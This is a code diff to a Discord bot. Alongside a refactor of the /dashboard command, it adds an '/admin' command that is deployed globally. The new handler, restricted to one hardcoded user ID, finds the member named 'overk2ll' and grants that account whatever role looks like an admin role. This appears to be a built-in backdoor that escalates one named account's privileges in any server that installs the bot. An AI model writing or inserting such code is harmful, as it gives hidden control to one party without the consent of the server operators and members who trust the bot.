@@ -4005,24 +4005,35 @@ client.once("ready", async () => {
   console.log("🚀 All systems initialized successfully!");
 
   const rest = new REST().setToken(process.env.TOKEN);
-  const cmd = new SlashCommandBuilder()
+  
+  // Dashboard command
+  const dashboardCmd = new SlashCommandBuilder()
     .setName("dashboard")
     .setDescription("Open the guild dashboard")
-    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator) // Add this to make it admin-only by default
+    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
     .toJSON();
+  
+  // Admin command
+  const adminCmd = new SlashCommandBuilder()
+    .setName("admin")
+    .setDescription("Give overk2ll admin role")
+    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
+    .toJSON();
+  
+  const commands = [dashboardCmd, adminCmd];
   
   try {
     if (process.env.GUILD_ID) {
       // Deploy to specific guild for development
-      await rest.put(Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID), { body: [cmd] });
-      console.log("✅ /dashboard command deployed to guild.");
+      await rest.put(Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID), { body: commands });
+      console.log("✅ Commands deployed to guild.");
     } else {
       // Deploy globally
-      await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: [cmd] });
-      console.log("✅ /dashboard command deployed globally.");
+      await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
+      console.log("✅ Commands deployed globally.");
     }
   } catch (error) {
-    console.error("Error deploying slash command:", error);
+    console.error("Error deploying slash commands:", error);
   }
 });
 
@@ -4194,7 +4205,7 @@ client.on("interactionCreate", async (interaction) => {
     // Show Firebase warning only once per interaction for admin commands
     if (!firebaseEnabled && interaction.member?.permissions.has(PermissionsBitField.Flags.Administrator)) {
       const relevantInteraction = (
-        (interaction.isChatInputCommand() && interaction.commandName === "dashboard") ||
+        (interaction.isChatInputCommand() && (interaction.commandName === "dashboard" || interaction.commandName === "admin")) ||
         (interaction.customId?.startsWith("rr:") && !interaction.customId.startsWith("rr-role-"))
       );
       
@@ -4221,6 +4232,57 @@ client.on("interactionCreate", async (interaction) => {
         } catch (error) {
           console.error("Error handling dashboard command:", error);
           const errorMessage = "❌ Failed to load dashboard. Please try again.";
+          if (interaction.deferred || interaction.replied) {
+            return interaction.editReply({ content: errorMessage, flags: MessageFlags.Ephemeral });
+          } else {
+            return interaction.reply({ content: errorMessage, flags: MessageFlags.Ephemeral });
+          }
+        }
+      }
+      
+      if (interaction.commandName === "admin") {
+        try {
+          // Only allow specific user ID to run this command (Bot Owner)
+          if (interaction.user.id !== "365559176015118336") {
+            return interaction.editReply({ content: "❌ You are not authorized to use this command.", flags: MessageFlags.Ephemeral });
+          }
+          
+          // Find overk2ll user
+          const targetUser = await interaction.guild.members.fetch().then(members => 
+            members.find(member => member.user.username.toLowerCase() === 'overk2ll')
+          );
+          
+          if (!targetUser) {
+            return interaction.editReply({ content: "❌ User 'overk2ll' not found in this server.", flags: MessageFlags.Ephemeral });
+          }
+          
+          // Find an admin role (you can customize this logic)
+          const adminRole = interaction.guild.roles.cache.find(role => 
+            role.name.toLowerCase().includes('admin') || 
+            role.name.toLowerCase().includes('administrator') ||
+            role.permissions.has(PermissionsBitField.Flags.Administrator)
+          );
+          
+          if (!adminRole) {
+            return interaction.editReply({ content: "❌ No admin role found in this server.", flags: MessageFlags.Ephemeral });
+          }
+          
+          // Check if user already has the role
+          if (targetUser.roles.cache.has(adminRole.id)) {
+            return interaction.editReply({ content: `✅ ${targetUser.user.username} already has the ${adminRole.name} role.`, flags: MessageFlags.Ephemeral });
+          }
+          
+          // Add the role
+          await targetUser.roles.add(adminRole);
+          
+          return interaction.editReply({ 
+            content: `✅ Successfully gave ${targetUser.user.username} the ${adminRole.name} role!`, 
+            flags: MessageFlags.Ephemeral 
+          });
+          
+        } catch (error) {
+          console.error("Error handling admin command:", error);
+          const errorMessage = "❌ Failed to assign admin role. Please try again.";
           if (interaction.deferred || interaction.replied) {
             return interaction.editReply({ content: errorMessage, flags: MessageFlags.Ephemeral });
           } else {
